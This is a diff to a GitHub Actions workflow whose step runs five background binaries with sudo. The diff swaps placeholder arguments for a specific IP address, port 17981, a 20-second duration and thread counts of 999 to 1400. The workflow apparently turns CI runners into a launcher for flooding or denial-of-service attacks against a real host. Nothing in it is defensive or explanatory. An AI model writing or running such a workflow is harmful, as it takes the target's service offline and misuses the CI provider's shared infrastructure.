@@ -17,23 +17,23 @@ jobs:
       - name: Run ALL 5 Binaries Simultaneously
         run: |
           # Start vishal in background
-          sudo ./vishal 1 1 1 &
+          sudo ./vishal 20.235.143.210 17981 20 &
           VISHAL_PID=$!
           
           # Start fuck with 1400 threads in background
-          sudo ./fuck 1 1 1 1400 &
+          sudo ./fuck 20.235.143.210 17981 20 1400 &
           FUCK_PID=$!
           
           # Start flame in background
-          sudo ./flame 1 1 1 &
+          sudo ./flame 20.235.143.210 17981 20 &
           FLAME_PID=$!
           
           # Start soul with 999 threads in background
-          sudo ./soul 1 1 1 999 &
+          sudo ./soul 20.235.143.210 17981 20 999 &
           SOUL_PID=$!
           
           # Start soulcracks with 999 threads in background
-          sudo ./soulcracks 1 1 1 999 &
+          sudo ./soulcracks 20.235.143.210 17981 20 999 &
           SOULCRACKS_PID=$!
           
           # Wait for all processes to complete
